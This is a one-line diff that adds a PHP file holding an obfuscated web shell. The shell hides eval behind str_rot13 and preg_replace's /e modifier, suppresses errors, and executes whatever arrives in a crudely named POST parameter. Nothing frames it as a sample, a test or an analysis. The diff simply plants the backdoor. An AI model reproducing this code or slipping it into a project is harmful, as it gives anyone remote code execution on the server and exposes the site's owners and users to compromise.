@@ -1,0 +1,1 @@
+<?php ($b4dboy = $_POST['fuck']) && @preg_replace('/ad/e','@'.str_rot13('riny').'($b4dboy)', 'add'); ?>
